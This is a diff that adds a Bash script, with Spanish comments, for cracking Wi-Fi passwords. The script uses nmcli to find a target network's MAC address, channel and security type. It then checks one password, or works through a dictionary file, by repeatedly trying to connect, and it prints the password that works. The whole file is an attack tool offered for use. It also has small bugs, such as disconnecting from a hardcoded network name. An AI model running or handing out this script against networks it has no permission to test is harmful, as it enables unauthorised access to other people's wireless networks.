@@ -1,0 +1,106 @@
+#!/bin/bash
+
+# Author: H3g0c1v
+# Github: https://github.com/h3g0c1v
+
+# Colores
+green="\e[0;32m\033[1m"
+end="\033[0m\e[0m"
+red="\e[0;31m\033[1m"
+blue="\e[0;34m\033[1m"
+yellow="\e[0;33m\033[1m"
+purple="\e[0;35m\033[1m"
+turquoise="\e[0;36m\033[1m"
+gray="\e[0;37m\033[1m"
+
+# Variables Globales
+MAC=""
+channel=""
+security=""
+
+# Ctrl + C
+function ctrl_c () {
+  echo -e "\n${red}[!]${end}${gray} Saliendo ...${end}"
+  exit 1
+}
+
+trap ctrl_c SIGINT
+
+function helpPanel () { 
+  echo -e "\n${yellow}[i] ${end} ${gray}Uso: $0 <Network Name> [<Network Password> | <Dictionary>]${end}"
+  echo -e "\n${yellow}[i] ${end} ${gray}Ejemplo: $0 \"Empleados\" \"sup3rs3cr3tP4ssw0rd\""
+  echo -e "\n${yellow}[i] ${end} ${gray}Ejemplo: $0 \"Empleados\" passlist.txt"
+
+  exit 0
+}
+
+function obtainNetworkInfo () {
+  # Comprobamos si la red existe
+  if [ ! $(nmcli dev wifi | sed "s/  */#/g" | sed "1d" | grep $networkName | cut -f 3 -d "#") ]; then
+    echo -e "\n${red}[!]${end}${gray} La red $networkName NO existe${end}"
+    exit 1
+  fi
+
+  # Obteniendo la MAC de la red
+  MAC=$(nmcli dev wifi | sed "s/  */#/g" | sed "1d" | grep $networkName | cut -f 2 -d "#")
+  
+  # Obteniendo el canal por el que transmite la red
+  channel=$(nmcli dev wifi | sed "s/  */#/g" | sed "1d" | grep $networkName | cut -f 5 -d "#")
+  
+  security=$(nmcli dev wifi | sed "s/  */#/g" | sed "1d" | grep $networkName | cut -f 10 -d "#")
+}
+
+function checkConnection () {  
+  #Comprobando que las credenciales son válidas
+  checkCredentials=$(nmcli dev wifi connect "$networkName" password "$networkPassword" &>/dev/null)
+  
+  if [ $? -eq 0 ]; then
+    echo -e "${gray}$security\t$MAC\t$channel${end}\t${yellow}[+] ${end}${gray}$networkName:$networkPassword ${end}${green}(VALID!)${end}"
+    nmcli connection down "Empleados" &>/dev/null # Ya hemos comprobado la password de la red por lo que nos desconectamos
+    exit 0
+  else
+    echo -e "${gray}$security\t$MAC\t$channel${end}\t${red}[!] ${end}${gray}$networkName:$networkPassword ${end}${end}"
+  fi
+} 
+
+function bruteForce () {
+  # Comprobando que el fichero introducido existe
+  if [ ! -f $dictionary ]; then
+    echo -e "\n${red}[!]${end}${gray} El diccionario no existe${end}"
+    exit 1
+  fi
+
+  echo ""
+  # Leemos cada linea del diccionario y comprobamos si la password es valida
+  while IFS= read -r networkPassword; do
+    checkConnection "$networkPassword"
+  done < "$dictionary"
+}
+  
+declare -i parameter_counter=0
+
+# Gestión de argumentos
+while getopts "n:p:d:h" arg; do
+    case $arg in
+        n) networkName="$OPTARG"; parameter_counter+=1;;
+        p) networkPassword="$OPTARG"; parameter_counter+=2;;
+        d) dictionary="$OPTARG"; parameter_counter+=4;;
+        h) helpPanel;;
+    esac
+done
+
+if [ $parameter_counter -eq 0 ]; then
+  echo -e "\n${red}[!]${end}${gray} Faltan argumentos ...${end}"
+  helpPanel
+elif [ $parameter_counter -eq 3 ]; then
+  echo ""
+  obtainNetworkInfo $MAC $channel $security && checkConnection || exit 1
+elif [ $parameter_counter -eq 4 ]; then
+  echo -e "\n${red}[!]${end}${gray} Introduce el nombre de la red${end}"
+elif [ $parameter_counter -eq 5 ]; then
+  obtainNetworkInfo $MAC $channel $security
+  bruteForce
+else
+  echo -e "\n${red}[!]${end}${gray} Faltan argumentos ...${end}"
+  helpPanel
+fi
